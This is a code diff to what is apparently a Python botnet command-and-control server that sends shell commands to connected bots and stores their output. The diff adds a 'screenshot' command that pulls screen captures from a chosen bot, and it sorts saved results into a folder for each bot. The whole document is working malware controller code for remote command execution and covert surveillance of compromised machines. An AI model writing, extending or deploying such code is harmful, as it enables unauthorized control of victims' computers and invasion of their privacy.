@@ -3,6 +3,7 @@ import struct
 from threading import Thread
 from time import sleep
 import sys
+import os
 
 botnet = {} #Botnet dictionary
 exec_command = "null"
@@ -81,7 +82,8 @@ def shell_exec(cmd):
         if(resp == "DONE"):
             shell_resp = botnet[bot].recv(1024).decode()
             print("[*] Shell execution successful on %s"%(bot))
-            make_output_file(str(bot),str(shell_resp))
+            check_container(bot)
+            make_output_file("shell_output",str(shell_resp))
         elif(resp == "FAILED"):
             print("[*] Shell execution failed on %s"%(bot))
 
@@ -99,6 +101,30 @@ def update_botnet():
                     pass
         except socket.error:
             print("[*] %s : Connection dead"%(bot))
+
+def check_container(bot):
+    if(os.path.exists(bot) != True):
+        os.makedirs(bot)
+    os.chdir(bot)
+
+def get_screenshot(addr):
+    global botnet
+    botnet[addr].send("screenshot".encode())
+    resp = botnet[addr].recv(10240)
+    try:
+        if(resp.decode() == "FAILED"):
+            print("[*] Failed to get screenshot from %s"%(addr))
+            return
+        else:
+            pass
+    except:
+        pass
+    image = resp
+    check_container(addr)
+    #os.chdir(addr)
+    file = open("scrnshot.png",'w')
+    file.write(image)
+    file.close()
 
 def exec_command(cmd):
     global botnet
@@ -128,6 +154,10 @@ def process_cmd(cmd):
             for bot in botnet:
                 print("[*] %d : %s"%(count,str(bot)))
                 count += 1
+
+        if "screenshot" in cmd:
+            addr = cmd.strip("screenshot ")
+            get_screenshot(addr)
 
         if 'execute' in cmd:
             #cmd = cmd.strip("execute ")
